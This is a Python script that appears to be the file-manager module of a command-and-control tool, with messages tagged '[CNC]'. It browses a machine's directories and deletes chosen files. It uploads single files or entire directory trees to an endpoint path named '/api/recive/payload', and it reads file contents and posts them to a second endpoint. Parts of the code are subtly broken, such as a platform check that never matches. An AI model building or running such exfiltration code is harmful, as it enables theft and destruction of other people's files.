import os,time
import tkinter.filedialog as fd
import requests
import os.path as path
from pprint import pprint
import colorama 
import subprocess
import string
import platform
from tabulate import tabulate
from colorama import Fore,Style
colorama.init()

ENDPOINT = 'http://127.0.0.1:8000'
def writetofile(error:str):
        with open("erors.txt",'a',encoding='utf-8')as e:
            e.write(str(error)+"\n")



class FileDialog:
    def __init__(self):
        self.commands =[["[file] --remove","deletes the selected file"],["[file] --read","prints the contents of the file"],["[file] --upload",'uploads the selected file to your machine']]


    def removefile(self,filepath):
        try:
                os.remove(filepath)
                print(Fore.GREEN+f"[CNC]:removed file {filepath} successfully")
        except Exception as e:
            writetofile(e)

    def uploadfile(self,filepath):
        try:
            if os.path.isfile(filepath):
                try:
                    with open(filepath,"rb") as b:
                        r = requests.post(f"{ENDPOINT}/api/recive/payload",files={"File_param":b})
                        if r.status_code == 200:
                            print(Fore.GREEN+f"[CNC]:file {filepath} Is being uploaded or uploaded")
                except Exception as e:
                    writetofile(e)
        except Exception as e:
                    writetofile(e)

    def manageupload(self,filepath):
        try:    
            if path.isdir(filepath):
                r = input("this will upload all file and subdirs in the directory that you selected do you want to proceed [y,n]?").lower()
                if r =='y':
                    for file in os.listdir(filepath):
                        floader = path.join(filepath,file)
                        self.manageupload(floader)
            else:
                self.uploadfile(filepath)

        except Exception as e:
            writetofile(e)

    def readfile(self,filepath):
        try:
            if platform.system() == "Linux":
                cmd = ['cat',filepath]
            elif platform.system() == "Windows":
                cmd = ['type',filepath]

            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            if err:
                text =("Error occurred while executing the command")
            else:
                text = out.decode()
            data = {
                "data":text,
                "file_name":filepath
                }
            
            r = requests.post(f"{ENDPOINT}/api/recive/text",json=data)
        except Exception as e:
            writetofile(e)

    def dostufftofile(self,base,filepath,cmd):
        if cmd == "remove":
            self.removefile(filepath=filepath)


        elif cmd == "upload" and ENDPOINT != None:
            self.manageupload(filepath)

        elif cmd == "read":
            self.readfile(filepath)

        elif cmd == "walk":
            if path.isdir(filepath):
                self.searchfiles(filepath)
            else:
                print("you cant walk a file it must be a dir")
                time.sleep(2)
                self.searchfiles(base)

        elif cmd == "back":
            try:
                self.searchfiles(os.path.dirname(base))
            except Exception as e:
                print(e)
        

            


    

    def searchfiles(self,folder_path):
        try:
            Files = {}
            data = []
            for file_or_folder in os.listdir(folder_path):
                floder =path.join(folder_path ,file_or_folder)
                file_type = "File" if os.path.isfile(floder) else "Folder"
                if file_type == "File":
                    Files[file_or_folder] = "File"
                    data.append([Fore.RED +file_or_folder+ Style.RESET_ALL, Fore.RED + file_type + Style.RESET_ALL])        
                else:
                    Files[file_or_folder] = "Folder "
                    data.append([Fore.BLUE + file_or_folder + Style.RESET_ALL, Fore.BLUE + file_type + Style.RESET_ALL])        

            table = tabulate(data, headers=["Name", "Type"], tablefmt="fancy_grid")
            print(table)

            inp = input(f"\n\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Filemanager: ")
            try:
                cmd = inp.split("--")[1]
            except:
                print("You have to add a Command")
            filename = inp.split("--")[0].strip(" ")
            floder =path.join(folder_path ,filename)
            print(f"CMD:{cmd} || filepath:{floder} || ENDPOINT:{ENDPOINT}")
            self.dostufftofile(base=folder_path,cmd=cmd,filepath=floder)
            
        

        except Exception as e:
            writetofile(e)                
                    

#print(fd.askdirectory())



APP = FileDialog()
    
while True:
    if platform.system == "Linux":
        try:
            APP.searchfiles('/')
        except Exception as e:
            writetofile(e)
    else:
        APP.searchfiles(os.path.expanduser("~"))